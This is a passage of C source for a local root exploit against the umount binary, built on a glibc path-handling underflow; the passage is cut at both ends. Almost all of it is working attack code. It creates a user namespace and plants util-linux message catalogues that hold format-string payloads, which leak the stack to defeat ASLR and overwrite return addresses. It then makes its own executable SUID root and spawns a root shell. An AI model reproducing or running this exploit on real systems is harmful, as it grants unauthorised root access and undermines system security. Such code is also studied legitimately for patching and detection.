\"\\x06\\0\\0\\0\\x24\\0\\0\\0\\x3e\\0\\0\\0\\x7f\\xb9\\x08\\x00\\xef\\x85\\x09\\x00\",\n    NULL};\n\n\nchar **osReleaseExploitData=NULL;\n\n\n/** Locate the umount binary within the given search path list,\n *  elements separated by colons.\n *  @return a pointer to a malloced memory region containing the\n *  string or NULL if not found.\n */\nchar* findUmountBinaryPathname(char *searchPath) {\n  char *testPathName=(char*)malloc(PATH_MAX);\n  assert(testPathName);\n\n\n  while(*searchPath) {\n    char *endPtr=strchr(searchPath, ':');\n    int length=endPtr-searchPath;\n    if(!endPtr) {\n      length=strlen(searchPath);\n      endPtr=searchPath+length-1;\n    }\n    int result=snprintf(testPathName, PATH_MAX, \"%.*s/%s\", length,\n        searchPath, \"umount\");\n    if(result>=PATH_MAX) {\n      fprintf(stderr, \"Binary search path element too long, ignoring it.\\n\");\n    } else {\n      struct stat statBuf;\n      result=stat(testPathName, &statBuf);\n// Just assume, that umount is owner-executable. There might be\n// alternative ACLs, which grant umount execution only to selected\n// groups, but it would be unusual to have different variants\n// of umount located searchpath on the same host.\n      if((!result)&&(S_ISREG(statBuf.st_mode))&&(statBuf.st_mode&S_IXUSR)) {\n        return(testPathName);\n      }\n    }\n    searchPath=endPtr+1;\n  }\n\n\n  free(testPathName);\n  return(NULL);\n}\n\n\n\n\n/** Get the value for a given field name.\n *  @return NULL if not found, a malloced string otherwise.\n */\nchar* getReleaseFileField(char *releaseData, int dataLength, char *fieldName) {\n  int nameLength=strlen(fieldName);\n  while(dataLength>0) {\n    char *nextPos=memchr(releaseData, '\\n', dataLength);\n    int lineLength=dataLength;\n    if(nextPos) {\n      lineLength=nextPos-releaseData;\n      nextPos++;\n    } else {\n      nextPos=releaseData+dataLength;\n    }\n    if((!strncmp(releaseData, fieldName, nameLength))&&\n        (releaseData[nameLength]=='=')) {\n      return(strndup(releaseData+nameLength+1, lineLength-nameLength-1));\n    }\n    releaseData=nextPos;\n    dataLength-=lineLength;\n  }\n  return(NULL);\n}\n\n\n\n\n/** Detect the release by reading the VERSION field from /etc/os-release.\n *  @return 0 on success.\n */\nint detectOsRelease() {\n  int handle=open(\"/etc/os-release\", O_RDONLY);\n  if(handle<0)\n    return(-1);\n\n\n  char *buffer=alloca(1024);\n  int infoLength=read(handle, buffer, 1024);\n  close(handle);\n  if(infoLength<0)\n    return(-1);\n  osRelease=getReleaseFileField(buffer, infoLength, \"VERSION\");\n  if(!osRelease)\n    osRelease=getReleaseFileField(buffer, infoLength, \"NAME\");\n  if(osRelease) {\n    fprintf(stderr, \"Detected OS version: %s\\n\", osRelease);\n    return(0);\n  }\n\n\n  return(-1);\n}\n\n\n\n\n/** Create the catalogue data in memory.\n *  @return a pointer to newly allocated catalogue data memory\n */\nchar* createMessageCatalogueData(char **origStringList, char **transStringList,\n    int stringCount, int *catalogueDataLength) {\n  int contentLength=strlen(messageCataloguePreamble)+2;\n  for(int stringPos=0; stringPos<stringCount; stringPos++) {\n    contentLength+=strlen(origStringList[stringPos])+\n        strlen(transStringList[stringPos])+2;\n  }\n  int preambleLength=(0x1c+0x14*(stringCount+1)+0xc)&-0xf;\n  char *catalogueData=(char*)malloc(preambleLength+contentLength);\n  memset(catalogueData, 0, preambleLength);\n  int *preambleData=(int*)catalogueData;\n  *preambleData++=0x950412de;\n  preambleData++;\n  *preambleData++=stringCount+1;\n  *preambleData++=0x1c;\n  *preambleData++=(*(preambleData-2))+(stringCount+1)*sizeof(int)*2;\n  *preambleData++=0x5;\n  *preambleData++=(*(preambleData-3))+(stringCount+1)*sizeof(int)*2;\n\n\n  char *nextCatalogueStringStart=catalogueData+preambleLength;\n  for(int stringPos=-1; stringPos<stringCount; stringPos++) {\n    char *writeString=(stringPos<0)?\"\":origStringList[stringPos];\n    int length=strlen(writeString);\n    *preambleData++=length;\n    *preambleData++=(nextCatalogueStringStart-catalogueData);\n    memcpy(nextCatalogueStringStart, writeString, length+1);\n    nextCatalogueStringStart+=length+1;\n  }\n  for(int stringPos=-1; stringPos<stringCount; stringPos++) {\n    char *writeString=(stringPos<0)?messageCataloguePreamble:transStringList[stringPos];\n    int length=strlen(writeString);\n    *preambleData++=length;\n    *preambleData++=(nextCatalogueStringStart-catalogueData);\n    memcpy(nextCatalogueStringStart, writeString, length+1);\n    nextCatalogueStringStart+=length+1;\n  }\n  assert(nextCatalogueStringStart-catalogueData==preambleLength+contentLength);\n  for(int stringPos=0; stringPos<=stringCount+1; stringPos++) {\n//    *preambleData++=(stringPos+1);\n    *preambleData++=(int[]){1, 3, 2, 0, 4}[stringPos];\n  }\n  *catalogueDataLength=preambleLength+contentLength;\n  return(catalogueData);\n}\n\n\n\n\n/** Create the catalogue data from the string lists and write\n *  it to the given file.\n *  @return 0 on success.\n */\nint writeMessageCatalogue(char *pathName, char **origStringList,\n    char **transStringList, int stringCount) {\n  int catalogueFd=open(pathName, O_WRONLY|O_CREAT|O_TRUNC|O_NOCTTY, 0644);\n  if(catalogueFd<0) {\n    fprintf(stderr, \"Failed to open catalogue file %s for writing.\\n\",\n        pathName);\n    return(-1);\n  }\n  int catalogueDataLength;\n  char *catalogueData=createMessageCatalogueData(\n      origStringList, transStringList, stringCount, &catalogueDataLength);\n  int result=write(catalogueFd, catalogueData, catalogueDataLength);\n  assert(result==catalogueDataLength);\n  close(catalogueFd);\n  free(catalogueData);\n  return(0);\n}\n\n\nvoid createDirectoryRecursive(char *namespaceMountBaseDir, char *pathName) {\n  char pathBuffer[PATH_MAX];\n  int pathNameLength=0;\n  while(1) {\n    char *nextPathSep=strchr(pathName+pathNameLength, '/');\n    if(nextPathSep) {\n      pathNameLength=nextPathSep-pathName;\n    } else {\n      pathNameLength=strlen(pathName);\n    }\n    int result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/%.*s\",\n        namespaceMountBaseDir, pathNameLength, pathName);\n    assert(result<PATH_MAX);\n    result=mkdir(pathBuffer, 0755);\n    assert((!result)||(errno==EEXIST));\n    if(!pathName[pathNameLength])\n      break;\n    pathNameLength++;\n  }\n}\n\n\n\n\n/** This child function prepares the namespaced mount point and\n *  then waits to be killed later on.\n */\nstatic int usernsChildFunction() {\n  while(geteuid()!=0) {\n    sched_yield();\n  }\n  int result=mount(\"tmpfs\", \"/tmp\", \"tmpfs\", MS_MGC_VAL, NULL);\n  assert(!result);\n  assert(!chdir(\"/tmp\"));\n  int handle=open(\"ready\", O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY, 0644);\n  assert(handle>=0);\n  close(handle);\n  sleep(100000);\n}\n\n\n/** Prepare a process living in an own mount namespace and setup\n *  the mount structure appropriately. The process is created\n *  in a way allowing cleanup at program end by just killing it,\n *  thus removing the namespace.\n *  @return the pid of that process or -1 on error.\n */\npid_t prepareNamespacedProcess() {\n  if(namespacedProcessPid==-1) {\n    fprintf(stderr, \"No pid supplied via command line, trying to create a namespace\\nCAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.\\n\");\n\n\n    char *stackData=(char*)malloc(1<<20);\n    assert(stackData);\n    namespacedProcessPid=clone(usernsChildFunction, stackData+(1<<20),\n        CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, NULL);\n    if(namespacedProcessPid==-1) {\n      fprintf(stderr, \"USERNS clone failed: %d (%s)\\n\", errno, strerror(errno));\n      return(-1);\n    }\n\n\n    char idMapFileName[128];\n    char idMapData[128];\n    sprintf(idMapFileName, \"/proc/%d/setgroups\", namespacedProcessPid);\n    int setGroupsFd=open(idMapFileName, O_WRONLY);\n    assert(setGroupsFd>=0);\n    int result=write(setGroupsFd, \"deny\", 4);\n    assert(result>0);\n    close(setGroupsFd);\n\n\n    sprintf(idMapFileName, \"/proc/%d/uid_map\", namespacedProcessPid);\n    int uidMapFd=open(idMapFileName, O_WRONLY);\n    assert(uidMapFd>=0);\n    sprintf(idMapData, \"0 %d 1\\n\", getuid());\n    result=write(uidMapFd, idMapData, strlen(idMapData));\n    assert(result>0);\n    close(uidMapFd);\n\n\n    sprintf(idMapFileName, \"/proc/%d/gid_map\", namespacedProcessPid);\n    int gidMapFd=open(idMapFileName, O_WRONLY);\n    assert(gidMapFd>=0);\n    sprintf(idMapData, \"0 %d 1\\n\", getgid());\n    result=write(gidMapFd, idMapData, strlen(idMapData));\n    assert(result>0);\n    close(gidMapFd);\n\n\n// After setting the maps for the child process, the child may\n// start setting up the mount point. Wait for that to complete.\n    sleep(1);\n    fprintf(stderr, \"Namespaced filesystem created with pid %d\\n\",\n        namespacedProcessPid);\n  }\n\n\n//   osReleaseExploitData=osSpecificExploitDataList;\n//   if(osRelease) {\n// // If an OS was detected, try to find it in list. Otherwise use\n// // default.\n//     for(int tPos=0; osSpecificExploitDataList[tPos]; tPos+=4) {\n//       if(!strcmp(osSpecificExploitDataList[tPos], osRelease)) {\n//         osReleaseExploitData=osSpecificExploitDataList+tPos;\n//         break;\n//       }\n//     }\n//   }\n  osReleaseExploitData = osSpecificExploitDataList;\n\n\n  char pathBuffer[PATH_MAX];\n  int result=snprintf(pathBuffer, sizeof(pathBuffer), \"/proc/%d/cwd\",\n     namespacedProcessPid);\n  assert(result<PATH_MAX);\n  char *namespaceMountBaseDir=strdup(pathBuffer);\n  assert(namespaceMountBaseDir);\n\n\n// Create directories needed for umount to proceed to final state\n// \"not mounted\".\n  createDirectoryRecursive(namespaceMountBaseDir, \"(unreachable)/x\");\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES\", osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/X.X/LC_MESSAGES\", osReleaseExploitData[2]);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/X.x/LC_MESSAGES\", osReleaseExploitData[2]);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n\n\n// Create symlink to trigger underflows.\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/(unreachable)/tmp/down\",\n      namespaceMountBaseDir);\n  assert(result<PATH_MAX);\n  result=symlink(osReleaseExploitData[1], pathBuffer);\n  assert(!result||(errno==EEXIST));\n\n\n// getdate will leave that string in rdi to become the filename\n// to execute for the next round.\n  char *selfPathName=realpath(\"/proc/self/exe\", NULL);\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/DATEMSK\",\n      namespaceMountBaseDir);\n  assert(result<PATH_MAX);\n  int handle=open(pathBuffer, O_WRONLY|O_CREAT|O_TRUNC, 0755);\n  assert(handle>0);\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"#!%s\\nunused\",\n      selfPathName);\n  assert(result<PATH_MAX);\n  result=write(handle, pathBuffer, result);\n  close(handle);\n  free(selfPathName);\n\n\n// Write the initial message catalogue to trigger stack dumping\n// and to make the \"umount\" call privileged by toggling the \"restricted\"\n// flag in the context.\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n\n\n  char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/8));\n  assert(stackDumpStr);\n  char *stackDumpStrEnd=stackDumpStr;\n  stackDumpStrEnd+=sprintf(stackDumpStrEnd, \"AA%%%d$lnAAAAAA\",\n      ((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);\n  for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCount--) {\n    memcpy(stackDumpStrEnd, \"%016lx\", 6);\n    stackDumpStrEnd+=6;\n  }\n// We wrote allready 8 bytes, write so many more to produce a\n// count of 'L' and write that to the stack. As all writes so\n// sum up to a count aligned by 8, and 'L'==0x4c, we will have\n// to write at least 4 bytes, which is longer than any \"%hhx\"\n// format string output. Hence do not care about the byte content\n// here. The target write address has a 16 byte alignment due\n// to varg structure.\n  stackDumpStrEnd+=sprintf(stackDumpStrEnd, \"%%1$%dhhx%%%d$hhn\",\n      ('L'-8-STACK_LONG_DUMP_BYTES*2)&0xff,\n      STACK_LONG_DUMP_BYTES/16);\n  *stackDumpStrEnd=0;\n  result=writeMessageCatalogue(pathBuffer,\n      (char*[]){\n          \"%s: mountpoint not found\",\n          \"%s: not mounted\",\n          \"%s: target is busy\\n        (In some cases useful info about processes that\\n         use the device is found by lsof(8) or fuser(1).)\"\n      },\n      (char*[]){\"1234\", stackDumpStr, \"5678\"},\n      3);\n  assert(!result);\n  free(stackDumpStr);\n\n\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n  result=mknod(pathBuffer, S_IFIFO|0666, S_IFIFO);\n  assert((!result)||(errno==EEXIST));\n  secondPhaseTriggerPipePathname=strdup(pathBuffer);\n\n\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  secondPhaseCataloguePathname=strdup(pathBuffer);\n\n\n  free(namespaceMountBaseDir);\n  return(namespacedProcessPid);\n}\n\n\n\n\n\n\n/** Create the format string to write an arbitrary value to the\n *  stack. The created format string avoids to interfere with\n *  the complex fprintf format handling logic by accessing fprintf\n *  internal state on stack. Thus the modification method does\n *  not depend on that ftp internals. The current libc fprintf\n *  implementation copies values for formatting before applying\n *  the %n writes, therefore pointers changed by fprintf operation\n *  can only be utilized with the next fprintf invocation. As\n *  we cannot rely on a stack having a suitable number of pointers\n *  ready for arbitrary writes, we need to create those pointers\n *  one by one. Everything needed is pointer on stack pointing\n *  to another valid pointer and 4 helper pointers pointing to\n *  writeable memory. The **argv list matches all those requirements.\n *  @param printfArgvValuePos the position of the argv pointer from\n *  printf format string view.\n *  @param argvStackAddress the address of the argv list, where\n *  the argv[0] pointer can be read.\n *  @param printfArg0ValuePos the position of argv list containing\n *  argv[0..n] pointers.\n *  @param mainFunctionReturnAddress the address on stack where\n *  the return address from the main() function to _libc_start()\n *  is stored.\n *  @param writeValue the value to write to mainFunctionReturnAddress\n */\nvoid createStackWriteFormatString(\n    char *formatBuffer, int bufferSize, int printfArgvValuePos,\n    void *argvStackAddress, int printfArg0ValuePos,\n    void *mainFunctionReturnAddress, unsigned short *writeData,\n    int writeDataLength) {\n  int result=0;\n  int currentValue=-1;\n  for(int nextWriteValue=0; nextWriteValue<0x10000;) {\n// Find the lowest value to write.\n    nextWriteValue=0x10000;\n    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {\n       int value=writeData[valuePos];\n       if((value>currentValue)&&(value<nextWriteValue))\n         nextWriteValue=value;\n    }\n    if(currentValue<0)\n      currentValue=0;\n    if(currentValue!=nextWriteValue) {\n      result=snprintf(formatBuffer, bufferSize, \"%%1$%1$d.%1$ds\",\n          nextWriteValue-currentValue);\n      formatBuffer+=result;\n      bufferSize-=result;\n      currentValue=nextWriteValue;\n    }\n    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {\n       if(writeData[valuePos]==nextWriteValue) {\n          result=snprintf(formatBuffer, bufferSize,\n              \"%%%d$hn\", printfArg0ValuePos+valuePos+1);\n          formatBuffer+=result;\n          bufferSize-=result;\n       }\n    }\n  }\n\n\n// Print the return function address location number of bytes\n// except 8 (those from the LABEL counter) and write the value\n// to arg1.\n  int writeCount=((long long)mainFunctionReturnAddress-18)&0xffff;\n  result=snprintf(formatBuffer, bufferSize,\n      \"%%1$%d.%ds%%1$s%%1$s%%%d$hn\",\n      writeCount, writeCount, printfArg0ValuePos);\n  formatBuffer+=result;\n  bufferSize-=result;\n\n\n// Write the LABEL 6 more times, thus multiplying the the single\n// byte write pointer to an 8-byte aligned argv-list pointer and\n// update argv[0] to point to argv[1..n].\n  writeCount=(((long long)argvStackAddress)-(writeCount+56))&0xffff;\n  result=snprintf(formatBuffer, bufferSize,\n      \"%%1$s%%1$s%%1$s%%1$s%%1$s%%1$s%%1$%d.%ds%%%d$hn\",\n      writeCount, writeCount, printfArgvValuePos);\n  formatBuffer+=result;\n  bufferSize-=result;\n\n\n// Append a debugging preamble.\n  result=snprintf(formatBuffer, bufferSize, \"-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$s\\n\",\n      printfArgvValuePos, printfArg0ValuePos-1, printfArg0ValuePos,\n      printfArg0ValuePos+1, printfArg0ValuePos+2, printfArg0ValuePos+3,\n      printfArg0ValuePos+4, printfArg0ValuePos+5, printfArg0ValuePos+6);\n  formatBuffer+=result;\n  bufferSize-=result;\n}\n\n\n\n\n/** Wait for the trigger pipe to open. The pipe will be closed\n *  immediately after opening it.\n *  @return 0 when the pipe was opened before hitting a timeout.\n */\nint waitForTriggerPipeOpen(char *pipeName) {\n  struct timespec startTime, currentTime;\n  int result=clock_gettime(CLOCK_MONOTONIC, &startTime);\n  startTime.tv_sec+=10;\n  assert(!result);\n  while(1) {\n    int pipeFd=open(pipeName, O_WRONLY|O_NONBLOCK);\n    if(pipeFd>=0) {\n      close(pipeFd);\n      break;\n    }\n    result=clock_gettime(CLOCK_MONOTONIC, &currentTime);\n    if(currentTime.tv_sec>startTime.tv_sec) {\n      return(-1);\n    }\n    currentTime.tv_sec=0;\n    currentTime.tv_nsec=100000000;\n    nanosleep(&currentTime, NULL);\n  }\n  return(0);\n}\n\n\n\n\n/** Invoke umount to gain root privileges.\n *  @return 0 if the umount process terminated with expected exit\n *  status.\n */\nint attemptEscalation() {\n  int escalationSuccess=-1;\n\n\n  char targetCwd[64];\n  snprintf(\n      targetCwd, sizeof(targetCwd)-1, \"/proc/%d/cwd\", namespacedProcessPid);\n\n\n  int pipeFds[2];\n  int result=pipe(pipeFds);\n  assert(!result);\n\n\n  pid_t childPid=fork();\n  assert(childPid>=0);\n  if(!childPid) {\n// This is the child process.\n    close(pipeFds[0]);\n    fprintf(stderr, \"Starting subprocess\\n\");\n    dup2(pipeFds[1], 1);\n    dup2(pipeFds[1], 2);\n    close(pipeFds[1]);\n    result=chdir(targetCwd);\n    assert(!result);\n\n\n// Create so many environment variables for a kind of \"stack spraying\".\n    int envCount=UMOUNT_ENV_VAR_COUNT;\n    char **umountEnv=(char**)malloc((envCount+1)*sizeof(char*));\n    assert(umountEnv);\n    umountEnv[envCount--]=NULL;\n    umountEnv[envCount--]=\"LC_ALL=C.UTF-8\";\n    while(envCount>=0) {\n      umountEnv[envCount--]=\"AANGUAGE=X.X\";\n    }\n// Use the built-in C locale.\n// Invoke umount first by overwriting heap downwards using links\n// for \"down\", then retriggering another error message (\"busy\")\n// with hopefully similar same stack layout for other path \"/run\".\n// The path \"/\" cannot be used as it is registered in \"/run/mount/utab\"\n// on standard desktop Xenial installs, thus triggering different\n// code path.\n    char* umountArgs[]={umountPathname, \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"down\", \"LABEL=78\", \"LABEL=789\", \"LABEL=789a\", \"LABEL=789ab\", \"LABEL=789abc\", \"LABEL=789abcd\", \"LABEL=789abcde\", \"LABEL=789abcdef\", \"LABEL=789abcdef0\", \"LABEL=789abcdef0\", NULL};\n    result=execve(umountArgs[0], umountArgs, umountEnv);\n    assert(!result);\n  }\n  close(pipeFds[1]);\n  int childStdout=pipeFds[0];\n\n\n  int escalationPhase=0;\n  char readBuffer[1024];\n  int readDataLength=0;\n  char stackData[STACK_LONG_DUMP_BYTES];\n  int stackDataBytes=0;\n\n\n  struct pollfd pollFdList[1];\n  pollFdList[0].fd=childStdout;\n  pollFdList[0].events=POLLIN;\n\n\n// Now learn about the binary, prepare data for second exploitation\n// phase. The phases should be:\n// * 0: umount executes, glibc underflows and causes an util-linux.mo\n//   file to be read, that contains a poisonous format string.\n//   Successful poisoning results in writing of 8*'A' preamble,\n//   we are looking for to indicate end of this phase.\n// * 1: The poisoned process writes out stack content to defeat\n//   ASLR. Reading all relevant stack end this phase.\n// * 2: The poisoned process changes the \"LANGUAGE\" parameter,\n//   thus triggering re-read of util-linux.mo. To avoid races,\n//   we let umount open a named pipe, thus blocking execution.\n//   As soon as the pipe is ready for writing, we write a modified\n//   version of util-linux.mo to another file because the pipe\n//   cannot be used for sending the content.\n// * 3: We read umount output to avoid blocking the process and\n//   wait for it to ROP execute fchown/fchmod and exit.\n  while(1) {\n    if(escalationPhase==2) {\n// We cannot use the standard poll from below to monitor the pipe,\n// but also we do not want to block forever. Wait for the pipe\n// in nonblocking mode and then continue with next phase.\n      result=waitForTriggerPipeOpen(secondPhaseTriggerPipePathname);\n      if(result) {\n        goto attemptEscalationCleanup;\n      }\n      escalationPhase++;\n    }\n\n\n// Wait at most 10 seconds for IO.\n    result=poll(pollFdList, 1, 10000);\n    if(!result) {\n// We ran into a timeout. This might be the result of a deadlocked\n// child, so kill the child and retry.\n      fprintf(stderr, \"Poll timed out\\n\");\n      goto attemptEscalationCleanup;\n    }\n// Perform the IO operations without blocking.\n    if(pollFdList[0].revents&(POLLIN|POLLHUP)) {\n      result=read(\n          pollFdList[0].fd, readBuffer+readDataLength,\n          sizeof(readBuffer)-readDataLength);\n      if(!result) {\n        if(escalationPhase<3) {\n// Child has closed the socket unexpectedly.\n          goto attemptEscalationCleanup;\n        }\n        break;\n      }\n      if(result<0) {\n        fprintf(stderr, \"IO error talking to child\\n\");\n        goto attemptEscalationCleanup;\n      }\n      readDataLength+=result;\n\n\n// Handle the data depending on escalation phase.\n      int moveLength=0;\n      switch(escalationPhase) {\n        case 0: // Initial sync: read A*8 preamble.\n          if(readDataLength<8)\n            continue;\n          char *preambleStart=memmem(readBuffer, readDataLength,\n              \"AAAAAAAA\", 8);\n          if(!preambleStart) {\n// No preamble, move content only if buffer is full.\n            if(readDataLength==sizeof(readBuffer))\n              moveLength=readDataLength-7;\n            break;\n          }\n// We found, what we are looking for. Start reading the stack.\n          escalationPhase++;\n          moveLength=preambleStart-readBuffer+8;\n        case 1: // Read the stack.\n// Consume stack data until or local array is full.\n          while(moveLength+16<=readDataLength) {\n            result=sscanf(readBuffer+moveLength, \"%016lx\",\n                (long*)(stackData+stackDataBytes));\n            if(result!=1) {\n// Scanning failed, the data injection procedure apparently did\n// not work, so this escalation failed.\n              goto attemptEscalationCleanup;\n            }\n            moveLength+=sizeof(long)*2;\n            stackDataBytes+=sizeof(long);\n// See if we reached end of stack dump already.\n            if(stackDataBytes==sizeof(stackData))\n              break;\n          }\n          if(stackDataBytes!=sizeof(stackData))\n            break;\n\n\n// All data read, use it to prepare the content for the next phase.\n          fprintf(stderr, \"Stack content received, calculating next phase\\n\");\n\n\n          int *exploitOffsets=(int*)osReleaseExploitData[3];\n\n\n// This is the address, where source Pointer is pointing to.\n          void *sourcePointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]];\n// This is the stack address source for the target pointer.\n          void *sourcePointerLocation=sourcePointerTarget-0xd0;\n\n\n          void *targetPointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARG0]];\n// This is the stack address of the libc start function return\n// pointer.\n          void *libcStartFunctionReturnAddressSource=sourcePointerLocation-0x10;\n          fprintf(stderr, \"Found source address location %p pointing to target address %p with value %p, libc offset is %p\\n\",\n              sourcePointerLocation, sourcePointerTarget,\n              targetPointerTarget, libcStartFunctionReturnAddressSource);\n// So the libcStartFunctionReturnAddressSource is the lowest address\n// to manipulate, targetPointerTarget+...\n\n\n          void *libcStartFunctionAddress=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]-2];\n          void *stackWriteData[]={\n              libcStartFunctionAddress+exploitOffsets[ED_LIBC_GETDATE_DELTA],\n              libcStartFunctionAddress+exploitOffsets[ED_LIBC_EXECL_DELTA]\n          };\n          fprintf(stderr, \"Changing return address from %p to %p, %p\\n\",\n              libcStartFunctionAddress, stackWriteData[0],\n              stackWriteData[1]);\n          escalationPhase++;\n\n\n          char *escalationString=(char*)malloc(1024);\n          createStackWriteFormatString(\n              escalationString, 1024,\n              exploitOffsets[ED_STACK_OFFSET_ARGV]+1, // Stack position of argv pointer argument for fprintf\n              sourcePointerTarget, // Base value to write\n              exploitOffsets[ED_STACK_OFFSET_ARG0]+1, // Stack position of argv[0] pointer ...\n              libcStartFunctionReturnAddressSource,\n              (unsigned short*)stackWriteData,\n              sizeof(stackWriteData)/sizeof(unsigned short)\n          );\n          fprintf(stderr, \"Using escalation string %s\", escalationString);\n\n\n          result=writeMessageCatalogue(\n              secondPhaseCataloguePathname,\n              (char*[]){\n                  \"%s: mountpoint not found\",\n                  \"%s: not mounted\",\n                  \"%s: target is busy\\n        (In some cases useful info about processes that\\n         use the device is found by lsof(8) or fuser(1).)\"\n              },\n              (char*[]){\n                  escalationString,\n                  \"BBBB5678%3$s\\n\",\n                  \"BBBBABCD%s\\n\"},\n              3);\n          assert(!result);\n          break;\n        case 2:\n        case 3:\n// Wait for pipe connection and output any result from mount.\n          readDataLength=0;\n          break;\n        default:\n          fprintf(stderr, \"Logic error, state %d\\n\", escalationPhase);\n          goto attemptEscalationCleanup;\n      }\n      if(moveLength) {\n        memmove(readBuffer, readBuffer+moveLength, readDataLength-moveLength);\n        readDataLength-=moveLength;\n      }\n    }\n  }\n\n\nattemptEscalationCleanup:\n// Wait some time to avoid killing umount even when exploit was\n// successful.\n  sleep(1);\n  close(childStdout);\n// It is safe to kill the child as we did not wait for it to finish\n// yet, so at least the zombie process is still here.\n  kill(childPid, SIGKILL);\n  pid_t waitedPid=waitpid(childPid, NULL, 0);\n  assert(waitedPid==childPid);\n\n\n  return(escalationSuccess);\n}\n\n\n\n\n/** This function invokes the shell specified via environment\n *  or the default shell \"/bin/sh\" when undefined. The function\n *  does not return on success.\n *  @return -1 on error\n */\nint invokeShell(char *shellName) {\n  if(!shellName)\n    shellName=getenv(\"SHELL\");\n  if(!shellName)\n    shellName=\"/bin/sh\";\n  char* shellArgs[]={shellName, NULL};\n  execve(shellName, shellArgs, environ);\n  fprintf(stderr, \"Failed to launch shell %s\\n\", shellName);\n  return(-1);\n}\n\n\nint main(int argc, char **argv) {\n  char *programmName=argv[0];\n  int exitStatus=1;\n\n\n  if(getuid()==0) {\n    fprintf(stderr, \"%s: you are already root, invoking shell ...\\n\",\n        programmName);\n    invokeShell(NULL);\n    return(1);\n  }\n\n\n  if(geteuid()==0) {\n    struct stat statBuf;\n    int result=stat(\"/proc/self/exe\", &statBuf);\n    assert(!result);\n    if(statBuf.st_uid||statBuf.st_gid) {\n      fprintf(stderr, \"%s: internal invocation, setting SUID mode\\n\",\n          programmName);\n      int handle=open(\"/proc/self/exe\", O_RDONLY);\n      fchown(handle, 0, 0);\n      fchmod(handle, 04755);\n      exit(0);\n    }\n\n\n    fprintf(stderr, \"%s: invoked as SUID, invoking shell ...\\n\",\n        programmName);\n    setresgid(0, 0, 0);\n    setresuid(0, 0, 0);\n    invokeShell(NULL);\n    return(1);\n  }\n\n\n  for(int argPos=1; argPos<argc;) {\n    char *argName=argv[argPos++];\n    if(argPos==argc) {\n      fprintf(stderr, \"%s requires parameter\\n\", argName);\n      return(1);\n    }\n    if(!strcmp(\"--Pid\", argName)) {\n      char *endPtr;\n      namespacedProcessPid=strtoll(argv[argPos++], &endPtr, 10);\n      if((errno)||(*endPtr)) {\n        fprintf(stderr, \"Invalid pid value\\n\");\n        return(1);\n      }\n      killNamespacedProcessFlag=0;\n    } else {\n      fprintf(stderr, \"Unknown argument %s\\n\", argName);\n      return(1);\n    }\n  }\n\n\n  fprintf(stderr, \"%s: setting up environment ...\\n\", programmName);\n\n\n  if(!osRelease) {\n    if(detectOsRelease()) {\n      fprintf(stderr, \"Failed to detect OS version, continuing anyway\\n\");\n    }\n  }\n\n\n  umountPathname=findUmountBinaryPathname(\"/bin\");\n  if((!umountPathname)&&(getenv(\"PATH\")))\n    umountPathname=findUmountBinaryPathname(getenv(\"PATH\"));\n  if(!umountPathname) {\n    fprintf(stderr, \"Failed to locate \\\"umount\\\" binary, is PATH correct?\\n\");\n    goto preReturnCleanup;\n  }\n  fprintf(stderr, \"%s: using umount at \\\"%s\\\".\\n\", programmName,\n      umountPathname);\n\n\n  pid_t nsPid=prepareNamespacedProcess();\n  if(nsPid<0) {\n    goto preReturnCleanup;\n  }\n\n\n// Gaining root can still fail due to ASLR creating additional\n// path separators in memory addresses residing in area to be\n// overwritten by buffer underflow. Retry regaining until this\n// executable changes uid/gid.\n  int escalateMaxAttempts=10;\n  int excalateCurrentAttempt=0;\n  while(excalateCurrentAttempt<escalateMaxAttempts) {\n    excalateCurrentAttempt++;\n    fprintf(stderr, \"Attempting to gain root, try %d of %d ...\\n\",\n        excalateCurrentAttempt, escalateMaxAttempts);\n\n\n    attemptEscalation();\n\n\n    struct stat statBuf;\n    int statResult=stat(\"/proc/self/exe\", &statBuf);\n       int stat(const char *pathname, struct stat *buf);\n    if(statResult) {\n      fprintf(stderr, \"Failed to stat /proc/self/exe: /proc not mounted, access restricted, executable deleted?\\n\");\n      break;\n    }\n    if(statBuf.st_uid==0) {\n      fprintf(stderr, \"Executable now root-owned\\n\");\n      goto escalateOk;\n    }\n  }\n\n\n  fprintf(stderr, \"Escalation FAILED, maybe target system not (yet) supported by 